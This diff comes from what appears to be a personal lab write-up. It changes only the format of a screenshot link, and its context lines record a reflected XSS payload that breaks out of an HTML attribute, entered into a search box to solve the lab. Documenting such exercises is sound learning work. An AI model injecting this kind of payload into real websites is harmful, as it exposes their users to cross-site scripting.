@@ -2,4 +2,4 @@
 
 Inserted the following payload into the search box to solve the lab:
 `" autofocus onfocus=alert(document.domain) x="
-![[Screenshot 2024-05-16 at 9.57.57 AM.png]]
+![Screenshot 2024-05-16 at 9.57.57 AM](images/Screenshot%202024-05-16%20at%209.57.57%20AM.png)
